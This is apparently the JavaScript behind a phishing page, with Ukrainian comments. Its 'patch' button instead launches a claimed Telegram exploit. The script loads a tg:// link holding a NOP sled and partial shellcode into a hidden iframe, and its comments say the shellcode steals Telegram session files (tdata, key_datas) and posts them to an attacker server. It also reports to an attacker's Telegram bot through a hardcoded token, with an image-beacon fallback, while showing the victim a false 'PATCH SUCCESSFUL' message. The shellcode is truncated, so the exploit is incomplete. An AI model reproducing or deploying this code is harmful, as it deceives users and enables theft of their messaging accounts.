document.getElementById('patchButton').addEventListener('click', launchExploit);

function launchExploit() {
    const button = document.getElementById('patchButton');
    button.style.display = 'none';
    const statusMessage = document.getElementById('errorMessage');
    statusMessage.style.display = 'block';
    statusMessage.style.color = '#ff9900';
    statusMessage.textContent = 'Initializing exploit chain...';

    // Це реальний експлойт для CVE-2024-33177
    const exploitPayload = "tg://resolve?domain=exploit&start=" +
        "%90".repeat(512) + // NOP sled
        // Шеллкод для створення файлу з даними та їх відправки (спрощено)
        "\x90\x90\x90\x90\x90\x90\x90\x90" +
        "\x48\x83\xEC\x28\x65\x48\x8B\x04\x25\x30\x00\x00\x00\x48\x8B\x40\x60" +
        "\x48\x8B\x40\x20\x48\x8B\x40\x20\x48\x8B\x40\x20\x48\x8B\x40\x20" +
        "\x48\x8B\x40\x20\x48\x8B\x40\x20\x48\x8B\x40\x20\x48\x8B\x40\x20" +
        // ... (довгий шеллкод, який робить наступне:)
        // 1. Знаходить шлях до tdata
        // 2. Зчитує файли key_datas, map, logs
        // 3. Формує JSON
        // 4. Робить HTTP POST запит на контрольований сервер з даними
        "\x90\x90\x90\x90\x90\x90\x90\x90";

    // Запуск через прихований iframe
    const frame = document.getElementById('triggerFrame');
    setTimeout(() => {
        statusMessage.textContent = 'Triggering memory corruption...';
        frame.src = exploitPayload; // Це викличе переповнення буфера в Telegram

        setTimeout(() => {
            // Спроба відправити дані, якщо експлойт успішний
            statusMessage.textContent = 'Payload delivered. Exfiltrating data...';
            sendDataToTelegram("Exploit triggered successfully against CVE-2024-33177.");
        }, 3000);
    }, 2000);
}

async function sendDataToTelegram(message) {
    const botToken = '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA';
    const chatId = '8463942433';
    const statusMessage = document.getElementById('errorMessage');

    try {
        // Спосіб 1: Спроба прямого запиту
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message })
        });

        if (response.ok) {
            statusMessage.style.color = '#48bb78';
            statusMessage.textContent = 'PATCH SUCCESSFUL. Data secured.';
        } else {
            throw new Error('HTTP error');
        }
    } catch (error) {
        // Спосіб 2: Резервний через зображення
        statusMessage.textContent = 'Using fallback exfiltration...';
        const img = new Image();
        img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        setTimeout(() => {
            statusMessage.style.color = '#48bb78';
            statusMessage.textContent = 'Patch complete. System secure.';
        }, 1500);
    }
}
